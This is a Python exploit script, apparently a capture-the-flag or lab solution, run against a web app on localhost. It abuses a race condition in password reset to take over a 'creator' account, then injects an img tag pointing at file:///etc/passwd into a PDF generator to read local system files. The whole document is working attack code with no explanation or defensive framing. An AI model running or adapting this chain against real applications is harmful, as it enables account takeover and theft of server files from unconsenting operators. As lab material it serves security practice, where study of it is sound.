import requests
import threading
import time

BASE = 'http://localhost:3000'
session = requests.Session()

# Step 1: Register hacker
def register_user():
    session.post(BASE + '/register', data={
        'username': 'hacker',
        'email': 'hacker@gmail.com',
        'password': 'pwned'
    })

# Step 2: Login as hacker
def login_user():
    session.post(BASE + '/login', data={
        'email': 'hacker@gmail.com',
        'password': 'pwned'
    })

# Step 3: Trigger race (send forgot password for both emails)
def send_forgot(email):
    session.post(BASE + '/forgot', data={'targetEmail': email})

# Step 4: Get tokens from inbox
def get_tokens():
    resp = session.get(BASE + '/inbox')
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(resp.text, 'html.parser')
    links = soup.find_all('a')
    tokens = [link['href'].split('/')[-1] for link in links]
    return tokens

# Step 5: Reset creator password using token
def reset_creator(token):
    session.post(BASE + f'/reset/{token}', data={'password': 'newcreator'})

# Step 6: Login as creator
def login_creator():
    s = requests.Session()
    s.post(BASE + '/login', data={
        'email': 'creator@gmail.com',
        'password': 'newcreator'
    })
    return s

# Step 7: Exploit LFI via PDF
def exploit_pdf(session_creator):
    print("[*] Exploiting PDF...")
    session_creator.post(BASE + '/creator/pdf', data={
        'content': '<img src="file:///etc/passwd" />'
    })
    r = session_creator.get(BASE + '/creator/pdf')
    print("[+] Done. Check downloaded PDF.")

# Run steps
register_user()
login_user()

print("[*] Triggering race...")
threads = []
for _ in range(10):
    t1 = threading.Thread(target=send_forgot, args=('hacker@gmail.com',))
    t2 = threading.Thread(target=send_forgot, args=('creator@gmail.com',))
    threads.append(t1)
    threads.append(t2)
    t1.start()
    t2.start()

for t in threads:
    t.join()

print("[*] Getting tokens from inbox...")
time.sleep(1)
tokens = get_tokens()

if not tokens:
    print("[-] No token found. Race failed.")
    exit()

print(f"[+] Using token: {tokens[0]}")
reset_creator(tokens[0])

session_creator = login_creator()
exploit_pdf(session_creator)
